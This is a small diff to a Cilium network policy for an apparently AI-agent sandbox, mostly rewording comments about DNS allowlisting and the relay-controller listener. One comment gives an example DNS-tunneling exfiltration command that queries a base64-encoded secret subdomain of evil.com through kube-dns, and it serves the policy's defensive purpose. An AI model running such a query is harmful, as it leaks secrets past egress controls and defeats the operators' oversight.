@@ -25,7 +25,7 @@
 # evaluates the union ruleset as permissive. Empirically verified on
 # Cilium 1.19.3.
 #
-# The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
+# The L7 allowlist closes the DNS-tunneling exfil vector: without it, an
 # agent can `dig <base64-secret>.evil.com @kube-dns` and leak data
 # through the resolver chain even with no external IP egress reachable.
 # Only relay-controller, this agent's tool pods, and the tenant's warm
@@ -81,8 +81,7 @@ spec:
         - ports:
             - port: "6443"
               protocol: TCP
-    # relay gateway: the harness dials Subscribe (inbound user
-    # messages) and DeliverOutbound (reply + turn-state).
+    # relay-controller internal listener (9090): every RelayInternal RPC.
     - toEndpoints:
         - matchLabels:
             app.kubernetes.io/name: relay-controller
